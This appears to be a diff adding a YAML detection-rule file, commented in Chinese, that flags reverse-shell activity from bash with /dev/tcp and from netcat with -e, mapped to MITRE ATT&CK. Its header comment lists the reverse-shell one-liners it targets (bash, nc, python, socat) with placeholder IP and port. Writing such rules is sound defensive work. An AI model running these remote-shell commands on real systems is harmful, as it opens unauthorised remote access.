@@ -1,0 +1,41 @@
+# 检测规则 — 反弹 Shell
+#
+# 反弹 Shell 是攻击者在获得命令执行后，建立反向连接获取交互式 Shell 的行为。
+# 典型手法:
+#   - bash -i >& /dev/tcp/IP/PORT 0>&1 (bash 内置 /dev/tcp)
+#   - nc -e /bin/bash IP PORT (Netcat 反弹)
+#   - python -c 'import socket;...' (Python 反弹)
+#   - socat TCP-L:PORT,reuseaddr,fork EXEC:bash (Socat 反弹)
+#
+# MITRE ATT&CK: T1059.004 Unix Shell — 属 Execution (TA0002) 战术
+#               反弹 Shell 的完整攻击链涉及 Execution + C2
+#               初始访问维度是 T1133/T1190, 这里检测的是执行阶段
+#               + TA0011 命令控制 (T1071 应用层协议)
+
+- name: "反弹Shell检测"
+  description: "检测通过 bash -i 或 /dev/tcp 建立的反弹 Shell 连接"
+  severity: critical
+  conditions:
+    - field: comm
+      operator: contains
+      value: "bash"
+    - field: args
+      operator: regex
+      value: "(-i|/dev/tcp|/dev/udp)"
+  alert_message: "检测到反弹 Shell 行为: 进程试图建立交互式反向连接"
+  mitre_tactic: "TA0002"
+  mitre_technique: "T1059.004"
+
+- name: "Netcat反弹Shell"
+  description: "检测 nc/ncat 建立的反弹 Shell"
+  severity: critical
+  conditions:
+    - field: comm
+      operator: regex
+      value: "(nc|ncat|netcat)"
+    - field: args
+      operator: regex
+      value: "(-e|-c)"
+  alert_message: "检测到 nc -e/-c 反弹 Shell 行为"
+  mitre_tactic: "TA0002"
+  mitre_technique: "T1059"
